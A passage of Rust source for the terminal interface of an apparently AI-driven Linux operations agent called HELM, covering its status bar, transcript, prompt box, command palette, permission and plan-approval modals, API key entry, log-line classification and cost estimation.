    let sep = || Span::styled("  ", Style::default().fg(OPS_DIM));
    let desc = |s: &'static str| Span::styled(s, Style::default().fg(OPS_DIM));
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Length(1)])
        .split(area);

    let line1 = Line::from(vec![
        key(" Tab"),
        desc(" focus panes"),
        sep(),
        key("F5"),
        desc(" refresh"),
        sep(),
        key("Enter"),
        desc(" select"),
        sep(),
        key("Alt+G"),
        desc(" gen plan"),
        sep(),
        key("Alt+E"),
        desc(" evidence"),
        sep(),
        key("Alt+A"),
        desc(" apply"),
        sep(),
        key("S"),
        desc(" suppress"),
    ]);
    Paragraph::new(line1)
        .style(Style::default().bg(OPS_SURFACE))
        .render(rows[0], buf);

    let right = "F1 help";
    let left = " R resolve";
    let pad = area
        .width
        .saturating_sub(left.len() as u16 + right.len() as u16) as usize;
    let line2 = Line::from(vec![
        key(" R"),
        desc(" resolve"),
        Span::styled(" ".repeat(pad), Style::default().fg(OPS_DIM)),
        key("F1"),
        desc(" help"),
    ]);
    Paragraph::new(line2)
        .style(Style::default().bg(OPS_SURFACE))
        .render(rows[1], buf);
}

#[allow(dead_code)]
fn finding_severity_color(raw: &str) -> Color {
    match raw {
        "critical" => ERROR_FG,
        "warning" => Color::Rgb(245, 184, 73),
        _ => SUCCESS_FG,
    }
}

#[allow(dead_code)]
fn finding_state_color(state: DashboardFindingState) -> Color {
    match state {
        DashboardFindingState::New => Color::Rgb(255, 139, 92),
        DashboardFindingState::Recurring => Color::Rgb(242, 201, 76),
        DashboardFindingState::Suppressed => DIM_FG,
        DashboardFindingState::Resolved | DashboardFindingState::SelfResolved => SUCCESS_FG,
        DashboardFindingState::Open => Color::Rgb(86, 156, 214),
    }
}

fn truncate_cell(value: &str, max_chars: usize) -> String {
    if value.chars().count() <= max_chars {
        value.to_owned()
    } else {
        let mut out = value
            .chars()
            .take(max_chars.saturating_sub(1))
            .collect::<String>();
        out.push('…');
        out
    }
}

fn fmt_bytes(bytes: u64) -> String {
    const GB: u64 = 1 << 30;
    const MB: u64 = 1 << 20;
    const KB: u64 = 1 << 10;
    if bytes >= GB {
        format!("{:.0}G", bytes as f64 / GB as f64)
    } else if bytes >= MB {
        format!("{:.0}M", bytes as f64 / MB as f64)
    } else if bytes >= KB {
        format!("{:.0}K", bytes as f64 / KB as f64)
    } else {
        format!("{}B", bytes)
    }
}

fn parse_log_line(line: &str) -> (String, &'static str, &'static str, String) {
    let lower = line.to_lowercase();
    let lvl = if lower.contains("crit") || lower.contains("oom") || lower.contains("killed") {
        "CRIT"
    } else if lower.contains("error")
        || lower.contains(" err ")
        || lower.contains("failed")
        || lower.contains("denied")
    {
        "ERR"
    } else if lower.contains("warn") {
        "WARN"
    } else {
        "INFO"
    };
    let svc = if lower.contains("kernel") || lower.contains("kern") {
        "kernel"
    } else if lower.contains("nginx") {
        "nginx"
    } else if lower.contains("postgres") {
        "postgres"
    } else if lower.contains("ssh") || lower.contains("auth") {
        "sshd"
    } else if lower.contains("systemd") {
        "systemd"
    } else {
        "journal"
    };
    let time = line
        .split_whitespace()
        .find(|part| part.len() == 8 && part.chars().nth(2) == Some(':'))
        .unwrap_or("--:--:--")
        .to_owned();
    let msg = line.chars().take(100).collect::<String>();
    (time, lvl, svc, msg)
}

fn provider_boundary_label(app: &TuiApp) -> &'static str {
    if !app.is_llm_provider_configured() {
        "ai off"
    } else if app.active_settings.choice == ProviderChoice::Ollama && !app.model.ends_with(":cloud")
    {
        "ai local"
    } else {
        "ai api"
    }
}

fn render_status(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Length(1)])
        .split(area);
    let spinner = if app.running {
        ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧"][app.spinner % 8]
    } else {
        "H"
    };
    let episode = app.session.episode_id.as_deref().unwrap_or("-");
    let elapsed = app
        .task_started
        .map(|start| format_duration(start.elapsed()))
        .unwrap_or_default();
    let mode_style = Style::default()
        .fg(Color::Black)
        .bg(Color::Rgb(80, 200, 120))
        .add_modifier(Modifier::BOLD);
    let mut line = Line::from(vec![
        Span::styled(
            format!(" {spinner} HELM "),
            Style::default()
                .fg(Color::White)
                .bg(HEADER_BG)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            format!(" {} / {} ", app.provider_name, truncate(&app.model, 42)),
            Style::default().fg(APP_FG).bg(HEADER_BG),
        ),
        Span::styled(
            format!(" {} ", provider_boundary_label(app)),
            Style::default()
                .fg(Color::Black)
                .bg(Color::Rgb(128, 203, 196)),
        ),
        Span::styled(
            format!(
                " {} ",
                app.active_remote
                    .as_deref()
                    .map(|target| format!("remote {}", truncate(target, 16)))
                    .unwrap_or_else(|| "local".to_owned())
            ),
            Style::default().fg(TOOL_FG).bg(HEADER_BG),
        ),
        Span::styled(
            format!(" episode {} ", truncate(episode, 8)),
            Style::default().fg(DIM_FG).bg(HEADER_BG),
        ),
        Span::styled(
            format!(" [{}] ", app.mode.as_str().to_ascii_uppercase()),
            mode_style,
        ),
        Span::styled(
            format!(" {} ", token_status(app)),
            Style::default().fg(DIM_FG).bg(HEADER_BG),
        ),
        Span::styled(
            format!(" {} ", truncate(&app.status_note, 28)),
            Style::default()
                .fg(if app.running { SUCCESS_FG } else { APP_FG })
                .bg(HEADER_BG),
        ),
    ]);
    if !elapsed.is_empty() {
        line.push_span(Span::styled(
            format!(" ⏱ {elapsed} "),
            Style::default().fg(TOOL_FG).bg(HEADER_BG),
        ));
    }
    Paragraph::new(line)
        .style(Style::default().bg(HEADER_BG))
        .render(chunks[0], buf);
    Paragraph::new("─".repeat(chunks[1].width as usize))
        .style(Style::default().fg(HEADER_BORDER).bg(APP_BG))
        .render(chunks[1], buf);
}

fn render_chat(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let chat_empty = app.session.chat.is_empty();
    let lines = chat_lines(&app.session.chat);
    let viewport_height = area.height.saturating_sub(2);
    app.last_chat_height.set(viewport_height);
    let (top_offset, scroll_from_bottom, max_scroll) =
        transcript_scroll_offsets(lines.len(), viewport_height, app.session.transcript_scroll);
    let title = if scroll_from_bottom > 0 {
        format!("Transcript  ↑ {} lines newer below", scroll_from_bottom)
    } else if max_scroll > 0 {
        "Transcript  at latest".to_owned()
    } else {
        "Transcript".to_owned()
    };
    if chat_empty && !app.running {
        let welcome = vec![
            Line::from(vec![Span::styled(
                "  HELM v1.6 — Linux Operations Agent",
                Style::default()
                    .fg(Color::White)
                    .add_modifier(Modifier::BOLD),
            )]),
            Line::from(""),
            Line::from(vec![Span::styled(
                "  Type a task or question to begin. Examples:",
                Style::default().fg(DIM_FG),
            )]),
            Line::from(vec![Span::styled(
                "    • \"check disk usage on /\"",
                Style::default().fg(APP_FG),
            )]),
            Line::from(vec![Span::styled(
                "    • \"what's listening on port 443?\"",
                Style::default().fg(APP_FG),
            )]),
            Line::from(vec![Span::styled(
                "    • \"show me nginx errors since last hour\"",
                Style::default().fg(APP_FG),
            )]),
            Line::from(""),
            Line::from(vec![
                Span::styled(
                    "  /",
                    Style::default()
                        .fg(HEADER_BORDER)
                        .add_modifier(Modifier::BOLD),
                ),
                Span::styled(" for commands  ", Style::default().fg(DIM_FG)),
                Span::styled(
                    "F5",
                    Style::default()
                        .fg(HEADER_BORDER)
                        .add_modifier(Modifier::BOLD),
                ),
                Span::styled(" refresh  ", Style::default().fg(DIM_FG)),
                Span::styled(
                    "Ctrl+P",
                    Style::default()
                        .fg(HEADER_BORDER)
                        .add_modifier(Modifier::BOLD),
                ),
                Span::styled(" for palette", Style::default().fg(DIM_FG)),
            ]),
        ];
        Paragraph::new(welcome)
            .block(
                Block::default()
                    .borders(Borders::LEFT | Borders::RIGHT)
                    .title(" Welcome ")
                    .border_style(Style::default().fg(HEADER_BORDER))
                    .style(Style::default().fg(APP_FG).bg(APP_BG)),
            )
            .render(area, buf);
        return;
    }
    Paragraph::new(lines)
        .block(
            Block::default()
                .borders(Borders::LEFT | Borders::RIGHT)
                .title(title)
                .border_style(Style::default().fg(INPUT_IDLE))
                .style(Style::default().fg(APP_FG).bg(APP_BG)),
        )
        .scroll((top_offset.min(u16::MAX as usize) as u16, 0))
        .wrap(Wrap { trim: false })
        .render(area, buf);

    if max_scroll > 0 && top_offset > 0 {
        let indicator = Rect {
            x: area.x.saturating_add(2),
            y: area.y,
            width: 14.min(area.width.saturating_sub(4)),
            height: 1,
        };
        Paragraph::new("↑ earlier")
            .style(Style::default().fg(DIM_FG).bg(APP_BG))
            .render(indicator, buf);
    }
    if scroll_from_bottom > 0 {
        let indicator = Rect {
            x: area.x.saturating_add(2),
            y: area.y.saturating_add(area.height.saturating_sub(1)),
            width: 12.min(area.width.saturating_sub(4)),
            height: 1,
        };
        Paragraph::new("↓ latest")
            .style(Style::default().fg(HEADER_BORDER).bg(APP_BG))
            .render(indicator, buf);
    }
}

fn render_slash_popup(app: &TuiApp, input_area: Rect, buf: &mut Buffer) {
    let filtered = {
        let raw = app.input.text.trim_start_matches('/').to_ascii_lowercase();
        let query = raw.split_whitespace().next().unwrap_or("").to_owned();
        app.slash_filtered()
            .into_iter()
            .filter(|item| item.slug().starts_with(query.as_str()))
            .collect::<Vec<_>>()
    };
    if filtered.is_empty() {
        return;
    }
    let selected = app.slash_popup.unwrap_or(0);
    let popup_h = (filtered.len() as u16 + 2).min(input_area.y.saturating_sub(1).max(4));
    let popup_w = 58_u16.min(input_area.width.saturating_sub(2));
    let popup_rect = Rect {
        x: input_area.x + 1,
        y: input_area.y.saturating_sub(popup_h),
        width: popup_w,
        height: popup_h,
    };
    let lines: Vec<Line> = filtered
        .iter()
        .enumerate()
        .map(|(i, cmd)| {
            let style = if i == selected {
                Style::default()
                    .fg(Color::White)
                    .bg(HEADER_BORDER)
                    .add_modifier(Modifier::BOLD)
            } else {
                Style::default().fg(APP_FG).bg(MODAL_BG)
            };
            Line::styled(
                format!(
                    " /{:<11} {:<18} {}",
                    cmd.slug(),
                    cmd.label(),
                    truncate(cmd.description(), 22)
                ),
                style,
            )
        })
        .collect();
    Clear.render(popup_rect, buf);
    Paragraph::new(lines)
        .block(
            Block::default()
                .borders(Borders::ALL)
                .border_style(Style::default().fg(HEADER_BORDER))
                .style(Style::default().fg(MODAL_FG).bg(MODAL_BG))
                .title("Commands  ↑↓ Tab Enter Esc"),
        )
        .render(popup_rect, buf);
}

fn render_input(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let counter = format!("{} chars  Enter to send", app.input.text.chars().count());
    let block = Block::default()
        .borders(Borders::ALL)
        .title(" Prompt ")
        .title_bottom(Line::styled(
            counter,
            Style::default().fg(DIM_FG).bg(INPUT_BG),
        ))
        .border_style(Style::default().fg(match app.focus {
            PanelFocus::Input => INPUT_FOCUS,
        }))
        .style(Style::default().fg(Color::White).bg(INPUT_BG));
    let body = if app.input.text.is_empty() {
        let placeholder = "Ask about the selected finding. Type /help for commands.";
        vec![Line::from(vec![
            Span::styled(
                "❯ ",
                Style::default().fg(USER_BAR).add_modifier(Modifier::BOLD),
            ),
            Span::styled(
                placeholder,
                Style::default().fg(DIM_FG).add_modifier(Modifier::ITALIC),
            ),
        ])]
    } else {
        app.input
            .text
            .lines()
            .enumerate()
            .map(|(index, line)| {
                if index == 0 {
                    Line::from(vec![
                        Span::styled(
                            "❯ ",
                            Style::default().fg(USER_BAR).add_modifier(Modifier::BOLD),
                        ),
                        Span::raw(line.to_owned()),
                    ])
                } else {
                    Line::from(vec![Span::raw("  "), Span::raw(line.to_owned())])
                }
            })
            .collect()
    };
    let paragraph = Paragraph::new(body).block(block).wrap(Wrap { trim: false });
    paragraph.render(area, buf);
}

fn render_footer(_app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let mode_label = "DASHBOARD";
    let mode_hint = "Tab panes | F5 refresh | Alt+E evidence | Alt+F check | Alt+G plan | Alt+A apply | 1-5 tabs";
    let line = Line::from(vec![
        Span::styled(
            format!(" [{mode_label}] "),
            Style::default()
                .fg(Color::White)
                .bg(HEADER_BORDER)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled(" ^P Palette ", Style::default().fg(DIM_FG).bg(APP_BG)),
        Span::styled("|", Style::default().fg(INPUT_IDLE).bg(APP_BG)),
        Span::styled(" ^C Cancel ", Style::default().fg(DIM_FG).bg(APP_BG)),
        Span::styled("|", Style::default().fg(INPUT_IDLE).bg(APP_BG)),
        Span::styled(" ^L Clear ", Style::default().fg(DIM_FG).bg(APP_BG)),
        Span::styled("|", Style::default().fg(INPUT_IDLE).bg(APP_BG)),
        Span::styled(" / Commands ", Style::default().fg(DIM_FG).bg(APP_BG)),
        Span::styled("|", Style::default().fg(INPUT_IDLE).bg(APP_BG)),
        Span::styled(
            format!(" {mode_hint} "),
            Style::default().fg(DIM_FG).bg(APP_BG),
        ),
    ]);
    Paragraph::new(line)
        .style(Style::default().fg(DIM_FG).bg(APP_BG))
        .render(area, buf);
}

fn token_status(app: &TuiApp) -> String {
    let estimate = estimated_cost(
        app.active_settings.choice,
        app.session_tokens_in,
        app.session_tokens_out,
    );
    match estimate {
        Some(cost) => format!(
            "{} in / {} out | ${cost:.4}",
            app.session_tokens_in, app.session_tokens_out
        ),
        None => format!(
            "{} in / {} out",
            app.session_tokens_in, app.session_tokens_out
        ),
    }
}

fn render_modal(app: &TuiApp, modal: &ModalState, area: Rect, buf: &mut Buffer) {
    Clear.render(area, buf);
    match modal {
        ModalState::CommandPalette => render_palette(app, area, buf),
        ModalState::Permission {
            capability,
            tool_name,
            taint,
            detail,
        } => {
            let text = vec![
                modal_kv("tool", tool_name),
                modal_kv("capability", &capability.to_string()),
                modal_kv("taint", taint),
                Line::from(""),
                Line::styled(detail.as_str(), Style::default().fg(MODAL_FG)),
                Line::from(""),
                Line::from(vec![
                    key_span("[Y] Once"),
                    Span::raw("  "),
                    key_span("[S] Session"),
                    Span::raw("  "),
                    key_span("[A] Always"),
                    Span::raw("  "),
                    Span::styled("[N/Esc] Deny", Style::default().fg(ERROR_FG)),
                ]),
            ];
            Paragraph::new(text)
                .block(modal_block(" Permission Required "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::ProviderSelector { selected } => {
            let choices = provider_selector_list();
            let mut lines = vec![
                Line::from("Press 1-7 or Up/Down+Enter to switch provider. Esc to cancel."),
                Line::from(""),
            ];
            for (i, (choice, env_key)) in choices.iter().enumerate() {
                let name = provider_choice_name(*choice);
                let key_status = app.provider_key_status(*choice).label(*env_key);
                let label = format!("[{}] {:<16} {}", i + 1, name, key_status);
                let style = if i == *selected {
                    Style::default()
                        .fg(Color::White)
                        .bg(HEADER_BORDER)
                        .add_modifier(Modifier::BOLD)
                } else {
                    Style::default().fg(MODAL_FG).bg(MODAL_BG)
                };
                lines.push(Line::styled(label, style));
            }
            lines.push(Line::from(""));
            lines.push(Line::from(
                "Tip: set the env key then press the number. Run `helm init --force` to persist.",
            ));
            Paragraph::new(lines)
                .block(modal_block(" Provider Selector "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::ModelSelector {
            query,
            selected,
            entries,
        } => {
            let entries = filtered_model_catalog(entries, query);
            let mut lines = vec![
                Line::from(vec![
                    Span::styled("Search ", Style::default().fg(Color::Gray)),
                    Span::raw(query.as_str()),
                    Span::styled("█", Style::default().fg(Color::Yellow)),
                ]),
                Line::from(""),
            ];
            let mut last_group = "";
            let visible_rows = 18usize;
            let start = if *selected >= visible_rows {
                selected.saturating_add(1).saturating_sub(visible_rows)
            } else {
                0
            };
            for (index, entry) in entries.iter().enumerate().skip(start).take(visible_rows) {
                if entry.group.as_str() != last_group {
                    if !last_group.is_empty() {
                        lines.push(Line::from(""));
                    }
                    lines.push(Line::styled(
                        entry.group.as_str(),
                        Style::default()
                            .fg(Color::LightMagenta)
                            .add_modifier(Modifier::BOLD),
                    ));
                    last_group = entry.group.as_str();
                }
                let note = entry.note.as_deref().unwrap_or("");
                let row = format!(
                    "{:<34} {:<14} {}",
                    entry.label,
                    provider_choice_name(entry.provider),
                    note
                );
                let style = if index == *selected {
                    Style::default()
                        .fg(Color::White)
                        .bg(HEADER_BORDER)
                        .add_modifier(Modifier::BOLD)
                } else {
                    Style::default().fg(MODAL_FG).bg(MODAL_BG)
                };
                lines.push(Line::styled(row, style));
            }
            if entries.is_empty() && !query.trim().is_empty() {
                lines.push(Line::from("No catalog match."));
                lines.push(Line::from(format!(
                    "Press Enter to use `{}` for the current provider.",
                    query.trim()
                )));
            }
            lines.push(Line::from(""));
            lines.push(Line::from("Enter select  Esc close  Type to filter"));
            Paragraph::new(lines)
                .block(modal_block(" Select Model "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::ApiKeyInput { choice, input } => {
            let env_name = default_api_key_env(*choice).unwrap_or("API_KEY");
            let lines = vec![
                Line::from(format!(
                    "Paste your {} API key and press Enter. Esc to cancel.",
                    provider_choice_name(*choice)
                )),
                Line::from(""),
                Line::from(vec![
                    Span::styled("Key: ", Style::default().fg(Color::Gray)),
                    Span::raw("*".repeat(input.len())),
                    Span::styled("█", Style::default().fg(Color::Yellow)),
                ]),
                Line::from(""),
                Line::from(format!(
                    "Or set ${env_name} in your shell and switch provider again."
                )),
            ];
            Paragraph::new(lines)
                .block(modal_block(" API Key Setup "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::AuthRequired {
            provider_name,
            env_name,
            input,
            error,
        } => {
            let mut lines = vec![
                Line::from(format!(
                    "Authentication failed for {}. Enter your API key:",
                    provider_name
                )),
                Line::from(""),
                Line::from(vec![
                    Span::styled("Key: ", Style::default().fg(Color::Gray)),
                    Span::raw("•".repeat(input.len())),
                    Span::styled("█", Style::default().fg(Color::Yellow)),
                ]),
                Line::from(""),
                Line::from(format!(
                    "Key will be saved to secrets store (also set ${env_name} to avoid this prompt)."
                )),
                Line::from(""),
                Line::from("Enter to save  Esc to cancel"),
            ];
            if let Some(error) = error {
                lines.push(Line::from(""));
                lines.push(Line::styled(
                    error.as_str(),
                    Style::default().fg(Color::Red),
                ));
            }
            Paragraph::new(lines)
                .block(modal_block(" API Key Required "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::Help => {
            Paragraph::new(if app.mode == AgentMode::Dashboard {
                "Dashboard: Tab focus panes | Left/Right or 1-8 switch tabs | Up/Down move queue | Enter drill in | Alt+E evidence | Alt+F follow-up | Alt+G guided plan | Alt+A apply | S suppress | R resolve | U reopen | F5 refresh | Ctrl+P palette | Ctrl+H/? help"
            } else {
                "Enter submit | Alt+Enter newline | Ctrl+P commands | Ctrl+N new session | Ctrl+C cancel running task, then Ctrl+C again to quit | PageUp/PageDown scroll | Ctrl+T toggle sidebar | Ctrl+H/? help"
            })
                .block(modal_block(" Help "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::ThemeSelector { selected } => {
            let themes = Theme::all();
            let mut lines = vec![Line::from(vec![Span::styled(
                "Theme Selector (↑↓ navigate, Enter apply) ",
                Style::default().fg(Color::Cyan),
            )])];
            for (i, theme) in themes.iter().enumerate() {
                let style = if i == *selected {
                    Style::default().fg(Color::White).bg(HEADER_BORDER)
                } else {
                    Style::default().fg(MODAL_FG)
                };
                lines.push(Line::styled(format!("  {} ", theme.name()), style));
            }
            lines.push(Line::from(""));
            lines.push(Line::from(vec![Span::styled(
                "  /theme <name> — switch theme inline ",
                Style::default().fg(DIM_FG),
            )]));
            Paragraph::new(lines)
                .block(modal_block(" Theme "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::CostMeter {
            session_tokens_in,
            session_tokens_out,
            session_cost_usd,
        } => {
            let content = format!(
                "Session Stats\n\nTokens in: {}\nTokens out: {}\nEst. cost: ${:.4}",
                session_tokens_in, session_tokens_out, session_cost_usd
            );
            Paragraph::new(content)
                .block(modal_block(" Cost Meter "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
        ModalState::PlanExecution {
            plan_id,
            plan_title,
            step_index,
            step_count,
            step_previews,
            step_effects,
            step_tools,
            step_risks,
            phase,
            result_summary,
        } => {
            let mut lines = Vec::new();
            match phase {
                PlanExecPhase::Approving => {
                    let i = *step_index;
                    lines.push(Line::from(Span::styled(
                        format!(
                            " Plan: {} ({}) — Step {}/{}",
                            plan_title,
                            plan_id,
                            i + 1,
                            step_count
                        ),
                        Style::default().fg(Color::Cyan),
                    )));
                    lines.push(Line::from(""));
                    if let Some(tool) = step_tools.get(i) {
                        lines.push(Line::from(format!(" Tool:     {tool}")));
                    }
                    if let Some(cmd) = step_previews.get(i) {
                        lines.push(Line::from(format!(" Command:  {cmd}")));
                    }
                    if let Some(effect) = step_effects.get(i) {
                        lines.push(Line::from(format!(" Effect:   {effect}")));
                    }
                    if let Some(risk) = step_risks.get(i) {
                        lines.push(Line::from(format!(" Risk:     {risk}")));
                    }
                    lines.push(Line::from(""));
                    lines.push(Line::from(Span::styled(
                        " [Y] Execute step   [N] Skip step   [!] Approve all remaining   [Esc] Cancel",
                        Style::default().fg(Color::Yellow),
                    )));
                }
                PlanExecPhase::Running => {
                    lines.push(Line::from(Span::styled(
                        " Executing plan... ",
                        Style::default().fg(Color::Green),
                    )));
                    lines.push(Line::from(format!(
                        " {}/{} steps complete",
                        step_index, step_count
                    )));
                }
                PlanExecPhase::Done => {
                    lines.push(Line::from(Span::styled(
                        " Execution complete ",
                        Style::default().fg(Color::Green),
                    )));
                    if !result_summary.is_empty() {
                        lines.push(Line::from(""));
                        lines.push(Line::from(Span::raw(result_summary.as_str())));
                    }
                    lines.push(Line::from(""));
                    lines.push(Line::from(Span::styled(
                        " Press any key to close ",
                        Style::default().fg(Color::Gray),
                    )));
                }
                PlanExecPhase::Loading => {
                    lines.push(Line::from(Span::styled(
                        " Loading plan... ",
                        Style::default().fg(Color::Gray),
                    )));
                }
            }
            Paragraph::new(lines)
                .block(modal_block(" Plan Execution "))
                .wrap(Wrap { trim: false })
                .render(area, buf);
        }
    }
}

fn render_palette(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let commands = app.filtered_palette_items();
    let mut lines = vec![Line::from(vec![
        Span::styled("query: ", Style::default().fg(Color::Gray)),
        Span::raw(app.command_palette.query.as_str()),
    ])];
    lines.push(Line::from(""));
    for (index, command) in commands.iter().enumerate() {
        let style = if index == app.command_palette.selected {
            Style::default()
                .fg(Color::White)
                .bg(HEADER_BORDER)
                .add_modifier(Modifier::BOLD)
        } else {
            Style::default().fg(MODAL_FG).bg(MODAL_BG)
        };
        lines.push(Line::styled(
            format!(
                "{:<20} /{:<12} {}",
                command.label(),
                command.slug(),
                command.description()
            ),
            style,
        ));
    }
    Paragraph::new(lines)
        .block(modal_block(" Command Palette "))
        .render(area, buf);
}

fn chat_lines(messages: &[ChatMessage]) -> Vec<Line<'static>> {
    let mut lines = Vec::new();
    for message in messages {
        let (bar, icon, icon_style, text_style) = match message.role {
            MessageRole::User => (
                USER_BAR,
                "▸",
                Style::default().fg(USER_BAR).add_modifier(Modifier::BOLD),
                Style::default().fg(USER_FG).bg(USER_BG),
            ),
            MessageRole::Assistant => (
                ASSISTANT_BAR,
                "H",
                Style::default()
                    .fg(ASSISTANT_BAR)
                    .add_modifier(Modifier::DIM),
                Style::default().fg(ASSISTANT_FG).bg(ASSISTANT_BG),
            ),
            MessageRole::System => (
                INPUT_IDLE,
                "•",
                Style::default().fg(DIM_FG),
                Style::default().fg(DIM_FG).bg(APP_BG),
            ),
            MessageRole::Activity => (
                TOOL_BG,
                tool_activity_icon(&message.text),
                Style::default().fg(TOOL_FG).bg(TOOL_BG),
                Style::default().fg(TOOL_FG).bg(TOOL_BG),
            ),
            MessageRole::Error => (
                ERROR_BAR,
                "✖",
                Style::default().fg(ERROR_FG).add_modifier(Modifier::BOLD),
                Style::default().fg(ERROR_FG).bg(ERROR_BG),
            ),
        };
        let mut emitted_any = false;
        for (index, line) in message.text.lines().enumerate() {
            emitted_any = true;
            if index == 0 {
                lines.push(Line::from(vec![
                    Span::styled("   ", Style::default().bg(bar)),
                    Span::styled(
                        " ",
                        Style::default().bg(match message.role {
                            MessageRole::User => USER_BG,
                            MessageRole::Assistant => ASSISTANT_BG,
                            MessageRole::Activity => TOOL_BG,
                            MessageRole::Error => ERROR_BG,
                            MessageRole::System => APP_BG,
                        }),
                    ),
                    Span::styled(format!("{icon} "), icon_style),
                    Span::styled(line.to_owned(), text_style),
                ]));
            } else {
                lines.push(Line::from(vec![
                    Span::styled("   ", Style::default().bg(bar)),
                    Span::styled("   ", text_style),
                    Span::styled(line.to_owned(), text_style),
                ]));
            }
        }
        if !emitted_any {
            lines.push(Line::from(vec![
                Span::styled("   ", Style::default().bg(bar)),
                Span::styled("   ", text_style),
            ]));
        }
        if message.role != MessageRole::Activity {
            lines.push(Line::styled(
                "─".repeat(16),
                Style::default().fg(INPUT_IDLE).bg(APP_BG),
            ));
        }
    }
    lines
}

fn tool_activity_icon(text: &str) -> &'static str {
    if text.ends_with("...") {
        "⚙"
    } else if text.contains("failed") || text.contains("denied") {
        "✗"
    } else {
        "✓"
    }
}

fn modal_block(title: &'static str) -> Block<'static> {
    Block::default()
        .borders(Borders::ALL)
        .border_type(BorderType::Double)
        .title(title)
        .title_style(
            Style::default()
                .fg(Color::White)
                .bg(HEADER_BORDER)
                .add_modifier(Modifier::BOLD),
        )
        .border_style(Style::default().fg(HEADER_BORDER))
        .style(Style::default().fg(MODAL_FG).bg(MODAL_BG))
}

fn modal_kv(label: &'static str, value: &str) -> Line<'static> {
    Line::from(vec![
        Span::styled(format!("{label:<11} "), Style::default().fg(DIM_FG)),
        Span::styled(value.to_owned(), Style::default().fg(MODAL_FG)),
    ])
}

fn key_span(text: &'static str) -> Span<'static> {
    Span::styled(
        text,
        Style::default()
            .fg(Color::White)
            .bg(HEADER_BORDER)
            .add_modifier(Modifier::BOLD),
    )
}

fn render_dim_overlay(area: Rect, buf: &mut Buffer) {
    let overlay = Block::default().style(Style::default().bg(Color::Black).fg(DIM_FG));
    overlay.render(area, buf);
}

fn render_toast(toast: &ToastState, area: Rect, buf: &mut Buffer) {
    let width = (toast.text.chars().count() as u16 + 6)
        .clamp(24, 52)
        .min(area.width.saturating_sub(2));
    let rect = Rect {
        x: area.x + area.width.saturating_sub(width + 2),
        y: area.y + area.height.saturating_sub(4),
        width,
        height: 3.min(area.height),
    };
    Clear.render(rect, buf);
    let (icon, border_color, bg) = match toast.variant {
        ToastVariant::Success => ("✓", SUCCESS_FG, TOOL_BG),
        ToastVariant::Error => ("✗", ERROR_FG, ERROR_BG),
        ToastVariant::Info => ("i", HEADER_BORDER, TOOL_BG),
    };
    Paragraph::new(Line::from(vec![
        Span::styled(format!("{icon} "), Style::default().fg(border_color).bg(bg)),
        Span::styled(toast.text.clone(), Style::default().fg(APP_FG).bg(bg)),
    ]))
    .block(
        Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(border_color))
            .style(Style::default().bg(bg)),
    )
    .render(rect, buf);
}

fn visible_activity_text(item: &ToolTimelineItem) -> Option<String> {
    match item.status.as_str() {
        "queued" | "run" | "call" | "done" | "parsed" | "valid" => None,
        "start" => Some(format!("running {}", item.tool)),
        "ok" => Some(format!("{} completed", item.tool)),
        "err" => Some(format!(
            "{} failed: {}",
            item.tool,
            truncate(&item.detail, 96)
        )),
        "deny" => Some(format!(
            "{} denied: {}",
            item.tool,
            truncate(&item.detail, 96)
        )),
        "warn" => Some(format!("warning: {}", truncate(&item.detail, 120))),
        "recover" => Some(format!("recovered tool-call format: {}", item.detail)),
        "correct" => Some(format!("corrected {} ({})", item.tool, item.detail)),
        "cancel" => Some("task cancelled".to_owned()),
        "audit" | "skills" => Some(format!("{}: {}", item.tool, item.detail)),
        _ => Some(format!(
            "{} {} — {}",
            item.status,
            item.tool,
            truncate(&item.detail, 120)
        )),
    }
}

fn activity_status_note(item: &ToolTimelineItem) -> String {
    match item.status.as_str() {
        "queued" => "queued".to_owned(),
        "run" => format!("episode {}", truncate(&item.detail, 8)),
        "call" => format!("calling {}", item.tool),
        "done" if item.tool == "provider" => "provider response received".to_owned(),
        "done" if item.tool == "episode" => "ready".to_owned(),
        "parsed" => format!("parsed {}", item.tool),
        "valid" => format!("validated {}", item.tool),
        "start" => format!("running {}", item.tool),
        "ok" => format!("{} ok", item.tool),
        "err" => format!("{} failed", item.tool),
        "deny" => format!("{} denied", item.tool),
        "warn" => "warning".to_owned(),
        "recover" => "format recovery used".to_owned(),
        "correct" => "correction sent".to_owned(),
        "cancel" => "cancelled".to_owned(),
        _ => format!("{} {}", item.status, item.tool),
    }
}

fn estimated_cost(provider: ProviderChoice, tokens_in: u32, tokens_out: u32) -> Option<f64> {
    let (input_per_million, output_per_million) = match provider {
        ProviderChoice::Anthropic => (3.0_f64, 15.0_f64),
        ProviderChoice::OpenaiCompat => (0.15_f64, 0.60_f64),
        ProviderChoice::Openrouter => (0.50_f64, 1.50_f64),
        ProviderChoice::Groq
        | ProviderChoice::Gemini
        | ProviderChoice::NvidiaNim
        | ProviderChoice::Ollama
        | ProviderChoice::Auto => return None,
    };
    Some(
        (f64::from(tokens_in) / 1_000_000.0_f64) * input_per_million
            + (f64::from(tokens_out) / 1_000_000.0_f64) * output_per_million,
    )
}

#[cfg(test)]
fn tool_call_summary(name: &str, input: &serde_json::Value) -> String {
    let object = input.as_object();
    match name {
        "shell" => {
            let command = object
                .and_then(|value| value.get("command"))
                .and_then(serde_json::Value::as_str)
                .unwrap_or("command");
            let mode = object
                .and_then(|value| value.get("mode"))
                .and_then(serde_json::Value::as_str)
                .unwrap_or("exec");
            if let Some(path) = object
